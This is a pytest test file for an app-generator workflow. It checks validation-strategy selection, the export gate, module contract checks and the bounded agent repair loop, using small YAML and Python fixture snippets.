from __future__ import annotations

import asyncio
import importlib
import importlib.util
import sys
from pathlib import Path

import pytest


def _workspace() -> Path:
    return Path(__file__).resolve().parents[1]


_FACTORY_APP_PATH = str(_workspace() / "factory_app")


@pytest.mark.parametrize("line_ending", ["\n", "\r\n"])
def test_validation_workspace_preserves_source_bytes(tmp_path, line_ending):
    from factory_app.workflows.AppGenerator.tools.app_validation import _write_files_to_dir

    text = line_ending.join(["first", "second", ""])
    _write_files_to_dir(tmp_path, {"README.md": text})
    assert (tmp_path / "README.md").read_bytes() == text.encode("utf-8")


@pytest.fixture(autouse=True)
def _clean_factory_app_syspath(monkeypatch):
    """Ensure factory_app/ is on sys.path during the test and clean up imported workflow modules after."""
    monkeypatch.delenv("MOZAIKS_APP_VALIDATION_STRATEGY", raising=False)
    added = _FACTORY_APP_PATH not in sys.path
    if added:
        sys.path.insert(0, _FACTORY_APP_PATH)

    # Track modules added during the test
    before = set(sys.modules.keys())

    yield

    # Remove only workflow-namespace modules ADDED during the test to avoid
    # cross-test pollution, including the top-level "workflows"/"factory_app"
    # package entries themselves — leaving a top-level package cached with a
    # __path__ resolved through the temporary sys.path entry would let later
    # tests import through it after the path is removed. Never delete entries
    # that existed before the test (that breaks dotted-path monkeypatch in
    # other files), and do NOT remove mozaiksai.* modules — other tests in the
    # suite depend on them staying cached.
    added_keys = [
        k for k in sys.modules
        if k not in before
        and (
            k == "workflows"
            or k == "factory_app"
            or k.startswith("workflows.")
            or k.startswith("factory_app.")
        )
    ]
    for k in added_keys:
        del sys.modules[k]

    if added:
        try:
            sys.path.remove(_FACTORY_APP_PATH)
        except ValueError:
            pass


def _import_workflow_module(module_name: str):
    """Import a workflow tool file directly from this repo's workflow pack."""
    parts = module_name.split(".")
    if len(parts) < 4 or parts[0] != "workflows":
        return importlib.import_module(module_name)

    workflow_name = parts[1]
    relative_parts = parts[3:]
    file_path = _workspace() / "factory_app" / "workflows" / workflow_name / "tools" / f"{relative_parts[-1]}.py"
    module_name_direct = f"tests.{workflow_name.lower()}_{relative_parts[-1]}_direct"
    spec = importlib.util.spec_from_file_location(module_name_direct, file_path)
    if spec is None or spec.loader is None:
        raise ImportError(f"Unable to load module spec for {file_path}")
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


class _Context:
    def __init__(self, initial: dict | None = None) -> None:
        self._data = dict(initial or {})

    def get(self, key: str, default=None):
        return self._data.get(key, default)

    def set(self, key: str, value) -> None:
        self._data[key] = value


def _accept_tasks(context, files, ownership):
    """Supply the approved producer inventory and its accepted batch evidence."""
    task_types = {
        "ConfigMiddlewareAgent": "module_contract", "ModelAgent": "data_models",
        "ServiceAgent": "business_services", "AppSchemaAgent": "page_bundle",
    }
    tasks = [
        {"task_id": task_id, "initial_agent": agent, "task_type": task_types[agent],
         "owned_paths": paths, "depends_on": []}
        for task_id, (agent, paths) in ownership.items()
    ]
    context.set("app_build_plan", {"build_tasks": tasks})
    context.set("app_task_batch_results", {
        task["task_id"]: {"code_files": [
            {"filename": path, "content": files[path]}
            for path in task["owned_paths"] if path in files
        ]}
        for task in tasks
    })


def _accept_support_tasks(context, files, *, missing_client=False):
    prefix = "modules/support_tickets/"
    ownership = {
        "support_contract": ("ConfigMiddlewareAgent", [
            prefix + "module.yaml", prefix + "contracts/events.yaml", prefix + "contracts/reactions.yaml",
        ]),
        "support_services": ("ServiceAgent", [
            path for path in files if path.startswith(prefix + "backend/") and not path.endswith("/schemas.py")
        ]),
        "support_pages": ("AppSchemaAgent", [
            path for path in files if path == "app.json" or path.startswith("ui/pages/")
        ]),
    }
    schemas = prefix + "backend/schemas.py"
    if schemas in files:
        ownership["support_models"] = ("ModelAgent", [schemas])
    if missing_client:
        ownership["managed_client"] = (
            "ConfigMiddlewareAgent", ["services/integrations/hosted_billing_client.py"],
        )
    _accept_tasks(context, files, ownership)
    for task in context.get("app_build_plan")["build_tasks"]:
        if task["task_id"].startswith("support_"):
            task["capability_pack_id"] = "support_tickets"


def _repair_responded(context):
    from factory_app.workflows.AppGenerator.tools.task_integrity import mark_repair_responded

    mark_repair_responded(context)


@pytest.mark.parametrize(
    ("status", "acceptance_status", "integration_passed", "allow_export"),
    [
        ("passed", "passed", True, True),
        ("skipped", "passed", True, True),
        ("passed", "failed", True, False),
        ("passed", None, True, False),
        ("failed", "passed", True, False),
        ("pending", "passed", True, False),
        (None, "passed", True, False),
        ("passed", "passed", False, False),
    ],
)
def test_resolve_export_gate_uses_acceptance_validation_and_integration(
    status,
    acceptance_status,
    integration_passed,
    allow_export,
) -> None:
    module = _import_workflow_module("workflows.AppGenerator.tools.export_app_code")
    context = _Context(
        {
            "app_validation_status": status,
            "app_bundle_acceptance_status": acceptance_status,
            "app_validation_strategy_used": "local",
            "integration_tests_passed": integration_passed,
        }
    )
    from factory_app.workflows.AppGenerator.tools.task_integrity import artifact_snapshot_digest

    context.set("generated_files", {"app.json": '{"app_id":"example"}'})
    context.set("app_build_plan", {"build_tasks": []})
    context.set("app_bundle_acceptance_result", {
        "snapshot_digest": artifact_snapshot_digest(context, context.get("generated_files")),
    })

    gate = module.resolve_export_gate(context)

    assert gate["allow_export"] is allow_export
    assert gate["app_validation_status"] == (status.lower() if isinstance(status, str) else status)
    assert gate["app_bundle_acceptance_status"] == (
        acceptance_status.lower() if isinstance(acceptance_status, str) else acceptance_status
    )
    assert gate["app_validation_strategy_used"] == "local"
    assert gate["integration_tests_passed"] is integration_passed


def test_validation_strategy_defaults_to_skip_when_e2b_local_and_docker_are_unavailable(monkeypatch) -> None:
    from mozaiksai.core.workflow.generator_support import (
        app_validation_strategy as app_validation_strategy_module,
    )

    monkeypatch.delenv("E2B_API_KEY", raising=False)
    monkeypatch.delenv("MOZAIKS_APP_VALIDATION_STRATEGY", raising=False)
    monkeypatch.setattr(app_validation_strategy_module, "local_app_validation_available", lambda: False)
    monkeypatch.setattr(app_validation_strategy_module, "docker_app_validation_available", lambda: False)

    strategy, reason = app_validation_strategy_module.resolve_app_validation_strategy(
        requested=None, context_value=None, local_available=False, docker_available=False
    )

    assert strategy == "skip"
    assert "resolved" in reason


def test_e2b_credentials_do_not_change_the_automatic_local_default() -> None:
    from mozaiksai.core.workflow.generator_support import (
        app_validation_strategy as app_validation_strategy_module,
    )

    strategy, reason = app_validation_strategy_module.resolve_app_validation_strategy(
        env={"E2B_API_KEY": "configured"},
        requested=None,
        context_value=None,
        local_available=False,
        docker_available=True,
    )

    assert strategy == "docker"
    assert "Docker" in reason


def test_e2b_remains_available_when_explicitly_selected() -> None:
    from mozaiksai.core.workflow.generator_support.app_validation_strategy import (
        resolve_app_validation_strategy,
    )

    strategy, reason = resolve_app_validation_strategy(
        env={"E2B_API_KEY": "configured"},
        requested="e2b",
        context_value=None,
        local_available=False,
        docker_available=True,
    )

    assert strategy == "e2b"
    assert "tool argument" in reason


def test_validation_strategy_summary_exposes_allowed_values() -> None:
    from mozaiksai.core.workflow.generator_support.app_validation_strategy import (
        build_app_validation_strategy_summary,
    )

    summary = build_app_validation_strategy_summary(env={}, local_available=False, docker_available=False)

    assert summary["allowed_values"] == ["e2b", "docker", "local", "skip"]
    assert summary["default_value"] == "skip"
    assert summary["options"][0]["value"] == "e2b"
    assert summary["options"][1]["value"] == "docker"
    assert summary["options"][2]["value"] == "local"
    assert summary["options"][3]["value"] == "skip"


def test_validation_strategy_rejects_invalid_explicit_values() -> None:
    from mozaiksai.core.workflow.generator_support.app_validation_strategy import (
        resolve_app_validation_strategy,
    )

    with pytest.raises(ValueError):
        resolve_app_validation_strategy(requested="invalid", context_value=None)


@pytest.mark.parametrize("requested,context", [("skip", "local"), ("docker", "skip"), (None, "skip")])
def test_operator_strategy_cannot_be_overridden_by_build_inputs(requested, context):
    from mozaiksai.core.workflow.generator_support.app_validation_strategy import (
        resolve_app_validation_strategy,
    )
    strategy, reason = resolve_app_validation_strategy(
        env={"MOZAIKS_APP_VALIDATION_STRATEGY": "e2b"}, requested=requested, context_value=context,
    )
    assert (strategy, reason) == ("e2b", "resolved from environment")


def test_invalid_operator_strategy_fails_before_a_build_can_override_it():
    from mozaiksai.core.workflow.generator_support.app_validation_strategy import (
        resolve_app_validation_strategy,
    )
    with pytest.raises(ValueError, match="Unsupported"):
        resolve_app_validation_strategy(env={"MOZAIKS_APP_VALIDATION_STRATEGY": "invalid"}, requested="skip")


def test_validate_app_build_skip_strategy_persists_context() -> None:
    module = _import_workflow_module("workflows.AppGenerator.tools.app_validation")
    context = _Context({"workflow_name": "AppGenerator", "chat_id": "chat-1", "app_id": "app-1"})

    result = asyncio.run(
        module.validate_app_build(
            files={"package.json": '{"name":"demo","scripts":{"build":"echo build"}}'},
            validation_strategy="skip",
            context_variables=context,
        )
    )

    assert result["success"] is True
    assert result["validation_strategy"] == "skip"
    assert result["validation_status"] == "skipped"
    assert context.get("app_validation_status") == "skipped"
    assert context.get("app_validation_strategy_used") == "skip"
    assert context.get("app_validation_preview_url") is None


def test_module_implementation_contract_rejects_missing_handler_methods() -> None:
    module = _import_workflow_module("workflows.AppGenerator.tools.app_validation")

    result = module.validate_module_implementation_contract(
        {
            "modules/tickets/module.yaml": """
schema_version: mozaiks.module.v1
module:
  id: tickets
  handler: backend.handler:TicketsModule
actions:
- id: list_tickets
  handler_method: list_tickets
- id: update_status
  handler_method: update_status
""",
            "modules/tickets/backend/handler.py": """
class TicketsModule:
    async def update_status(self, ctx, **params):
        return {"ok": True}
""",
        }
    )

    assert result["passed"] is False
    assert any(
        item["test"] == "module_action_handler_method_missing"
        and "list_tickets" in item["error"]
        for item in result["failed_tests"]
    )


def test_module_implementation_contract_rejects_unresolved_class_base() -> None:
    module = _import_workflow_module("workflows.AppGenerator.tools.app_validation")

    result = module.validate_module_implementation_contract(
        {
            "modules/tickets/module.yaml": """
schema_version: mozaiks.module.v1
module:
  id: tickets
  handler: backend.handler:TicketsModule
actions:
- id: list_tickets
  handler_method: list_tickets
""",
            "modules/tickets/backend/handler.py": """
class TicketsModule:
    async def list_tickets(self, ctx, **params):
        return {"tickets": []}
""",
            "modules/tickets/backend/schemas.py": """
from typing import TypedDict

class TicketStatus(str, Enum):
    OPEN = "open"
""",
        }
    )

    assert result["passed"] is False
    assert any(
        item["test"] == "backend_python_unresolved_class_base"
        and "Enum" in item["error"]
        for item in result["failed_tests"]
    )


def test_module_implementation_contract_rejects_handler_context_last_signature() -> None:
    module = _import_workflow_module("workflows.AppGenerator.tools.app_validation")

    result = module.validate_module_implementation_contract(
        {
            "modules/tickets/module.yaml": """
schema_version: mozaiks.module.v1
module:
  id: tickets
  handler: backend.handler:TicketsModule
actions:
- id: update_status
  handler_method: update_status
  input_schema:
    required: [ticket_id, status]
""",
            "modules/tickets/backend/handler.py": """
class TicketsModule:
    async def update_status(self, ticket_id: str, status: str, context):
        return {"ok": True}
""",
        }
    )

    assert result["passed"] is False
    assert any(
        item["test"] == "module_handler_context_parameter"
        and "ticket_id" in item["error"]
        for item in result["failed_tests"]
    )


def test_module_implementation_contract_accepts_ctx_kwargs_signature() -> None:
    module = _import_workflow_module("workflows.AppGenerator.tools.app_validation")

    result = module.validate_module_implementation_contract(
        {
            "modules/tickets/module.yaml": """
schema_version: mozaiks.module.v1
module:
  id: tickets
  handler: backend.handler:TicketsModule
actions:
- id: update_status
  handler_method: update_status
  input_schema:
    required: [ticket_id, status]
""",
            "modules/tickets/backend/handler.py": """
class TicketsModule:
    async def update_status(self, ctx, **params):
        return {"ok": True}
""",
        }
    )

    assert result["passed"] is True


def test_module_implementation_contract_rejects_synthetic_payload_for_field_inputs() -> None:
    module = _import_workflow_module("workflows.AppGenerator.tools.app_validation")

    result = module.validate_module_implementation_contract(
        {
            "modules/tickets/module.yaml": """
schema_version: mozaiks.module.v1
module:
  id: tickets
  handler: backend.handler:TicketsModule
actions:
- id: update_status
  handler_method: update_status
  input_schema:
    required: [ticket_id, new_status]
""",
            "modules/tickets/backend/handler.py": """
class TicketsModule:
    async def update_status(self, ctx, **params):
        return {"ok": True}
""",
            "modules/tickets/backend/service.py": """
class TicketsService:
    async def update_status(self, ctx, **params):
        payload = params.get("payload")
        return payload
""",
        }
    )

    assert result["passed"] is False
    assert any(
        item["test"] == "module_service_synthetic_payload_wrapper"
        for item in result["failed_tests"]
    )


def test_module_implementation_contract_rejects_undeclared_service_params_key() -> None:
    module = _import_workflow_module("workflows.AppGenerator.tools.app_validation")

    result = module.validate_module_implementation_contract(
        {
            "modules/tickets/module.yaml": """
schema_version: mozaiks.module.v1
module:
  id: tickets
  handler: backend.handler:TicketsModule
actions:
- id: save_settings
  handler_method: save_settings
  input_schema:
    required: [default_queue, sla_hours]
    properties:
    - name: default_queue
    - name: sla_hours
""",
            "modules/tickets/backend/handler.py": """
class TicketsModule:
    async def save_settings(self, ctx, **params):
        return {"ok": True}
""",
            "modules/tickets/backend/service.py": """
class TicketsService:
    async def save_settings(self, ctx, **params):
        settings = params["settings"]
        return settings
""",
        }
    )

    assert result["passed"] is False
    assert any(
        item["test"] == "module_service_undeclared_params_key"
        and "settings" in item["error"]
        for item in result["failed_tests"]
    )


def test_module_implementation_contract_rejects_pass_backed_runtime_logic() -> None:
    module = _import_workflow_module("workflows.AppGenerator.tools.app_validation")

    result = module.validate_module_implementation_contract(
        {
            "modules/tickets/module.yaml": """
schema_version: mozaiks.module.v1
module:
  id: tickets
  handler: backend.handler:TicketsModule
actions:
- id: save_settings
  handler_method: save_settings
""",
            "modules/tickets/backend/handler.py": """
class TicketsModule:
    async def save_settings(self, ctx, **params):
        return {"ok": True}
""",
            "modules/tickets/backend/repo.py": """
class TicketsRepo:
    async def save_settings(self, ctx, settings):
        pass
""",
        }
    )

    assert result["passed"] is False
    assert any(
        item["test"] == "backend_python_pass_statement"
        for item in result["failed_tests"]
    )


@pytest.mark.asyncio
async def test_validate_app_bundle_from_request_blocks_module_implementation_failure(monkeypatch) -> None:
    module = importlib.import_module("factory_app.workflows.AppGenerator.tools.app_validation")

    async def fake_validate_app_build(**kwargs):
        return {"validation_status": "skipped", "validation_strategy": "skip"}

    monkeypatch.setattr(module, "validate_app_build", fake_validate_app_build)
    context = _Context(
        {
            "generated_files": {
                "modules/tickets/module.yaml": """
schema_version: mozaiks.module.v1
module:
  id: tickets
  handler: backend.handler:TicketsModule
actions:
- id: list_tickets
  handler_method: list_tickets
""",
                "modules/tickets/backend/handler.py": """
class TicketsModule:
    pass
""",
            }
        }
    )

    result = await module.validate_app_bundle_from_request(
        {"validation_strategy": "skip", "start_dev_server": False},
        context_variables=context,
    )

    assert result["status"] == "failed"
    assert result["integration_tests_passed"] is False
    assert context.get("integration_tests_passed") is False
    assert context.get("module_implementation_validation_passed") is False
    assert context.get("integration_test_result")["module_implementation"]["failed_tests"]


@pytest.mark.asyncio
async def test_validate_app_bundle_from_request_blocks_runtime_quality_warnings(monkeypatch) -> None:
    module = importlib.import_module("factory_app.workflows.AppGenerator.tools.app_validation")

    async def fake_validate_app_build(**kwargs):
        return {"validation_status": "skipped", "validation_strategy": "skip"}

    monkeypatch.setattr(module, "validate_app_build", fake_validate_app_build)
    context = _Context(
        {
            "generated_files": {
                "modules/tickets/module.yaml": """
schema_version: mozaiks.module.v1
module:
  id: tickets
  handler: backend.handler:TicketsModule
actions:
- id: save_settings
  handler_method: save_settings
""",
                "modules/tickets/backend/handler.py": """
class TicketsModule:
    async def save_settings(self, ctx, **params):
        return {"ok": True}
""",
                "modules/tickets/backend/policy.py": """
class TicketsPolicy:
    async def require_save_settings(self, ctx):
        # Placeholder for auth logic
        return True
""",
            }
        }
    )

    result = await module.validate_app_bundle_from_request(
        {"validation_strategy": "skip", "start_dev_server": False},
        context_variables=context,
    )

    assert result["status"] == "failed"
    assert context.get("integration_tests_passed") is False
    assert context.get("module_runtime_quality_status") == "blocked"
    assert context.get("integration_test_result")["module_runtime_quality"]["warnings"]


@pytest.mark.asyncio
async def test_validate_app_bundle_from_request_blocks_workflow_integration_failure(monkeypatch) -> None:
    module = importlib.import_module("factory_app.workflows.AppGenerator.tools.app_validation")
    from scripts.smoke_appgenerator_live_acceptance import (
        build_appgenerator_acceptance_files,
        default_workflow_integration,
    )

    async def fake_validate_app_build(**kwargs):
        return {"validation_status": "skipped", "validation_strategy": "skip"}

    monkeypatch.setattr(module, "validate_app_build", fake_validate_app_build)
    integration = default_workflow_integration()
    files = build_appgenerator_acceptance_files(integration)
    del files["modules/support_tickets/contracts/reactions.yaml"]
    context = _Context(
        {
            "generated_files": files,
            "generated_workflow_name": integration["workflow_name"],
            "generated_workflow_capability_id": integration["capability_id"],
            "generated_workflow_startup_mode": integration["startup_mode"],
            "generated_workflow_trigger_events": integration["trigger_events"],
        }
    )

    _accept_support_tasks(context, files)
    result = await module.validate_app_bundle_from_request(
        {"validation_strategy": "skip", "start_dev_server": False},
        context_variables=context,
    )

    assert result["status"] == "failed"
    assert result["integration_tests_passed"] is False
    assert result["workflow_integration_validation_result"]["passed"] is False
    assert result["bundle_repair"]["status"] == "needs_revision"
    assert result["bundle_repair"]["target_agent"] == "ConfigMiddlewareAgent"
    assert context.get("workflow_integration_validation_passed") is False
    assert context.get("bundle_repair_status") == "needs_revision"
    assert context.get("integration_test_result")["workflow_integration"]["failed_tests"]
    assert context.get("integration_test_result")["bundle_repair"]["status"] == "needs_revision"


@pytest.mark.asyncio
async def test_app_bundle_acceptance_schedules_service_agent_bundle_repair() -> None:
    module = importlib.import_module("factory_app.workflows.AppGenerator.tools.app_validation")
    from scripts.smoke_appgenerator_live_acceptance import (
        build_appgenerator_acceptance_files,
        default_workflow_integration,
    )

    integration = default_workflow_integration()
    files = build_appgenerator_acceptance_files(integration)
    files["modules/support_tickets/backend/token_wallet_ledger.py"] = (
        "class TokenWalletLedger:\n"
        "    pass\n"
    )
    context = _Context(
        {
            "generated_files": files,
            "generated_workflow_name": integration["workflow_name"],
            "generated_workflow_capability_id": integration["capability_id"],
            "generated_workflow_startup_mode": integration["startup_mode"],
            "generated_workflow_trigger_events": integration["trigger_events"],
        }
    )

    _accept_support_tasks(context, files)
    result = await module.run_app_bundle_acceptance_gate(files=files, context_variables=context)

    assert result["passed"] is False
    assert result["bundle_repair"]["status"] == "needs_revision"
    assert result["bundle_repair"]["target_agent"] == "ServiceAgent"
    assert result["bundle_repair"]["attempt"] == 1
    assert context.get("bundle_repair_status") == "needs_revision"
    assert context.get("bundle_repair_target") == "ServiceAgent"
    assert context.get("bundle_repair_attempt_count") == 1
    assert "app-local token wallet or usage ledger" in context.get("bundle_repair_request")
    assert context.get("integration_test_result")["bundle_repair"]["target_agent"] == "ServiceAgent"


@pytest.mark.asyncio
@pytest.mark.parametrize("repair", [False, True])
async def test_module_implementation_failure_uses_bounded_bundle_repair(repair: bool) -> None:
    from scripts.smoke_appgenerator_live_acceptance import (
        build_appgenerator_acceptance_files,
        default_workflow_integration,
    )

    module = importlib.import_module("factory_app.workflows.AppGenerator.tools.app_validation")
    integration = default_workflow_integration()
    files = build_appgenerator_acceptance_files(integration)
    handler = "modules/support_tickets/backend/handler.py"
    files["modules/support_tickets/backend/base_handler.py"] = files[handler].replace(
        "class SupportTicketsModule:", "class SupportTicketsBaseModule:",
    )
    files[handler] = "from .base_handler import SupportTicketsBaseModule as SupportTicketsModule\n"
    context = _Context({
        "generated_workflow_name": integration["workflow_name"],
        "generated_workflow_capability_id": integration["capability_id"],
        "generated_workflow_startup_mode": integration["startup_mode"],
        "generated_workflow_trigger_events": integration["trigger_events"],
    })
    _accept_support_tasks(context, files)
    first = await module.run_app_bundle_acceptance_gate(files=files, context_variables=context)
    assert first["passed"] is False
    assert first["module_implementation"]["passed"] is False
    assert first["bundle_repair"]["status"] == "needs_revision"
    assert first["bundle_repair"]["target_agent"] == "ServiceAgent"
    assert first["bundle_repair"]["attempt"] == 1
    assert handler in context.get("bundle_repair_request")
    assert "module_handler_class_exists" in context.get("bundle_repair_request")
    if repair:
        files[handler] = (
            "from .base_handler import SupportTicketsBaseModule\n\n"
            "class SupportTicketsModule(SupportTicketsBaseModule):\n"
            '    """Workspace customization boundary."""\n'
        )
    _repair_responded(context)
    second = await module.run_app_bundle_acceptance_gate(files=files, context_variables=context)
    assert second["passed"] is repair
    assert second["bundle_repair"]["status"] == ("passed" if repair else "blocked")
    assert second["bundle_repair"]["no_progress"] is (not repair)
    assert second["bundle_repair"]["target_agent"] is None
    assert context.get("bundle_repair_attempt_count") == 1


@pytest.mark.asyncio
@pytest.mark.parametrize("repair", [False, True])
async def test_runtime_import_failure_uses_stable_bounded_bundle_repair(repair) -> None:
    from scripts.smoke_appgenerator_live_acceptance import (
        build_appgenerator_acceptance_files,
        default_workflow_integration,
    )

    module = importlib.import_module("factory_app.workflows.AppGenerator.tools.app_validation")
    integration = default_workflow_integration()
    files = build_appgenerator_acceptance_files(integration)
    handler = "modules/support_tickets/backend/handler.py"
    original = files[handler]
    files[handler] = "from .schemas import missing_detail_serializer\n" + original
    context = _Context({
        "generated_workflow_name": integration["workflow_name"],
        "generated_workflow_capability_id": integration["capability_id"],
        "generated_workflow_startup_mode": integration["startup_mode"],
        "generated_workflow_trigger_events": integration["trigger_events"],
    })
    _accept_support_tasks(context, files)
    first = await module.run_app_bundle_acceptance_gate(files=files, context_variables=context)
    assert first["passed"] is False
    assert first["app_runtime_load"]["passed"] is False
    assert first["bundle_repair"]["target_agent"] == "ServiceAgent"
    assert first["bundle_repair"]["attempt"] == 1
    assert handler in context.get("bundle_repair_request")
    assert "mozaiks-app-runtime-load-" not in context.get("bundle_repair_request")
    if repair:
        files[handler] = original
    _repair_responded(context)
    second = await module.run_app_bundle_acceptance_gate(files=files, context_variables=context)
    assert second["passed"] is repair
    assert second["bundle_repair"]["status"] == ("passed" if repair else "blocked")
    assert second["bundle_repair"]["no_progress"] is (not repair)
    assert context.get("bundle_repair_attempt_count") == 1


@pytest.mark.asyncio
async def test_runtime_validation_cleanup_preserves_concurrent_workflow_imports(monkeypatch) -> None:
    from types import ModuleType, SimpleNamespace

    from mozaiksai.core.runtime.app.loader import AppLoader

    module = importlib.import_module("factory_app.workflows.AppGenerator.tools.app_validation")
    existing = ModuleType("mozaiks_runtime_module_fixture")
    existing.__file__ = str(_workspace() / "factory_app/app/modules/fixture/backend/handler.py")
    concurrent = ModuleType("concurrent_workflow_fixture")
    concurrent.__file__ = str(_workspace() / "factory_app/workflows/Fixture/__init__.py")
    marker = "concurrent-workflow-path"
    monkeypatch.setitem(sys.modules, existing.__name__, existing)
    monkeypatch.setattr(sys, "path", list(sys.path))

    async def load(root):
        transient = ModuleType(existing.__name__)
        transient.__file__ = str(Path(root) / "modules/fixture/backend/handler.py")
        sys.modules[existing.__name__] = transient
        sys.modules[concurrent.__name__] = concurrent
        sys.path.extend([root, str(Path(root).parent), marker])
        return SimpleNamespace(
            definition=SimpleNamespace(name="Fixture", pages=[], workflows=[]),
            modules=[], failed_module_names=[], subscriptions_config=None,
        )

    monkeypatch.setattr(AppLoader, "load", load)
    try:
        result = await module._app_runtime_load_result({"app.json": "{}"})
        assert result["passed"] is True
        assert sys.modules[existing.__name__] is existing
        assert sys.modules[concurrent.__name__] is concurrent
        assert marker in sys.path
        assert not any("mozaiks-app-runtime-load-" in entry for entry in sys.path)
    finally:
        sys.modules.pop(concurrent.__name__, None)


@pytest.mark.asyncio
async def test_deleting_a_required_planned_file_cannot_close_acceptance_or_export() -> None:
    validation_module = importlib.import_module("factory_app.workflows.AppGenerator.tools.app_validation")
    export_module = importlib.import_module("factory_app.workflows.AppGenerator.tools.export_app_code")
    from scripts.smoke_appgenerator_live_acceptance import (
        build_appgenerator_acceptance_files,
        default_workflow_integration,
    )

    integration = default_workflow_integration()
    files = build_appgenerator_acceptance_files(integration)
    forbidden_path = "modules/support_tickets/backend/token_wallet_ledger.py"
    files[forbidden_path] = (
        "class TokenWalletLedger:\n"
        "    pass\n"
    )
    context = _Context(
        {
            "app_id": "repair-app",
            "generated_files": files,
            "generated_workflow_name": integration["workflow_name"],
            "generated_workflow_capability_id": integration["capability_id"],
            "generated_workflow_startup_mode": integration["startup_mode"],
            "generated_workflow_trigger_events": integration["trigger_events"],
        }
    )

    _accept_support_tasks(context, files)
    failed = await validation_module.run_app_bundle_acceptance_gate(
        files=files,
        context_variables=context,
    )

    assert failed["passed"] is False
    assert failed["bundle_repair"]["target_agent"] == "ServiceAgent"

    context.set("deleted_files", [forbidden_path])
    _repair_responded(context)
    repaired = await validation_module.run_app_bundle_acceptance_gate(
        context_variables=context,
    )

    assert repaired["passed"] is False
    assert any(
        item["path"] == forbidden_path and item["code"] == "PLANNED_ARTIFACT_MISSING"
        for item in repaired["planned_completeness"]["diagnostics"]
    )
    assert forbidden_path not in context.get("generated_files")
    assert context.get("integration_tests_passed") is False

    context.set("app_validation_status", "skipped")
    context.set("app_validation_strategy_used", "skip")
    export_gate = export_module.resolve_export_gate(context)

    assert export_gate["allow_export"] is False
    assert export_gate["reasons"]


@pytest.mark.asyncio
async def test_app_bundle_acceptance_schedules_app_schema_repair_for_direct_managed_endpoint() -> None:
    module = importlib.import_module("factory_app.workflows.AppGenerator.tools.app_validation")
    from scripts.smoke_appgenerator_live_acceptance import (
        build_appgenerator_acceptance_files,
        default_workflow_integration,
    )

    integration = default_workflow_integration()
    files = build_appgenerator_acceptance_files(integration)
    files["services/integrations/hosted_billing_client.py"] = "class HostedBillingClient: pass\n"
    files["ui/pages/support_tickets.yaml"] += (
        "\n# scanner fixture\n"
        "api_endpoint: /api/modules/hosted_billing/open_checkout\n"
    )
    context = _Context(
        {
            "generated_files": files,
            "generated_workflow_name": integration["workflow_name"],
            "generated_workflow_capability_id": integration["capability_id"],
            "generated_workflow_startup_mode": integration["startup_mode"],
            "generated_workflow_trigger_events": integration["trigger_events"],
        }
    )

    _accept_support_tasks(context, files)
    result = await module.run_app_bundle_acceptance_gate(
        files=files,
        context_variables=context,
        capability_packs=[
            {"id": "hosted_billing", "capability_source": "managed_capability"},
        ],
    )

    assert result["passed"] is False
    assert result["bundle_repair"]["status"] == "needs_revision"
    assert result["bundle_repair"]["target_agent"] == "AppSchemaAgent"
    assert context.get("bundle_repair_target") == "AppSchemaAgent"
    assert any(
        "ui/pages/support_tickets.yaml" in error and "calls managed capability endpoint" in error
        for error in result["bundle_repair"]["target_errors"]
    )


@pytest.mark.asyncio
async def test_app_bundle_acceptance_schedules_config_repair_for_missing_managed_client() -> None:
    module = importlib.import_module("factory_app.workflows.AppGenerator.tools.app_validation")
    from scripts.smoke_appgenerator_live_acceptance import (
        build_appgenerator_acceptance_files,
        default_workflow_integration,
    )

    integration = default_workflow_integration()
    files = build_appgenerator_acceptance_files(integration)
    context = _Context(
        {
            "generated_files": files,
            "generated_workflow_name": integration["workflow_name"],
            "generated_workflow_capability_id": integration["capability_id"],
            "generated_workflow_startup_mode": integration["startup_mode"],
            "generated_workflow_trigger_events": integration["trigger_events"],
        }
    )

    _accept_support_tasks(context, files, missing_client=True)
    result = await module.run_app_bundle_acceptance_gate(
        files=files,
        context_variables=context,
        capability_packs=[
            {"id": "hosted_billing", "capability_source": "managed_capability"},
        ],
    )

    assert result["passed"] is False
    assert result["bundle_repair"]["status"] == "needs_revision"
    assert result["bundle_repair"]["target_agent"] == "ConfigMiddlewareAgent"
    assert context.get("bundle_repair_target") == "ConfigMiddlewareAgent"
    assert any("services/integrations/hosted_billing_client.py" in error for error in result["bundle_repair"]["target_errors"])


@pytest.mark.asyncio
async def test_app_bundle_acceptance_blocks_bundle_repair_after_max_attempts() -> None:
    module = importlib.import_module("factory_app.workflows.AppGenerator.tools.app_validation")
    from scripts.smoke_appgenerator_live_acceptance import (
        build_appgenerator_acceptance_files,
        default_workflow_integration,
    )

    integration = default_workflow_integration()
    files = build_appgenerator_acceptance_files(integration)
    files["modules/support_tickets/backend/token_wallet_ledger.py"] = (
        "class TokenWalletLedger:\n"
        "    pass\n"
    )
    context = _Context(
        {
            "generated_files": files,
            "generated_workflow_name": integration["workflow_name"],
            "generated_workflow_capability_id": integration["capability_id"],
            "generated_workflow_startup_mode": integration["startup_mode"],
            "generated_workflow_trigger_events": integration["trigger_events"],
            "bundle_repair_attempt_count": 2,
        }
    )

    _accept_support_tasks(context, files)
    result = await module.run_app_bundle_acceptance_gate(files=files, context_variables=context)

    assert result["passed"] is False
    assert result["bundle_repair"]["status"] == "blocked"
    assert result["bundle_repair"]["repairable"] is False
    assert result["bundle_repair"]["target_agent"] is None
    assert result["bundle_repair"]["attempt"] == 2
    assert context.get("bundle_repair_status") == "blocked"
    assert context.get("bundle_repair_target") is None
    assert context.get("bundle_repair_attempt_count") == 2


@pytest.mark.asyncio
async def test_app_bundle_acceptance_blocks_identical_no_progress_repair() -> None:
    module = importlib.import_module("factory_app.workflows.AppGenerator.tools.app_validation")
    from scripts.smoke_appgenerator_live_acceptance import (
        build_appgenerator_acceptance_files,
        default_workflow_integration,
    )

    integration = default_workflow_integration()
    files = build_appgenerator_acceptance_files(integration)
    files["modules/support_tickets/backend/token_wallet_ledger.py"] = (
        "class TokenWalletLedger:\n"
        "    pass\n"
    )
    context = _Context(
        {
            "generated_files": files,
            "generated_workflow_name": integration["workflow_name"],
            "generated_workflow_capability_id": integration["capability_id"],
            "generated_workflow_startup_mode": integration["startup_mode"],
            "generated_workflow_trigger_events": integration["trigger_events"],
        }
    )

    _accept_support_tasks(context, files)
    first = await module.run_app_bundle_acceptance_gate(files=files, context_variables=context)
    _repair_responded(context)
    repeated = await module.run_app_bundle_acceptance_gate(files=files, context_variables=context)

    assert first["bundle_repair"]["status"] == "needs_revision"
    assert repeated["bundle_repair"]["status"] == "blocked"
    assert repeated["bundle_repair"]["no_progress"] is True
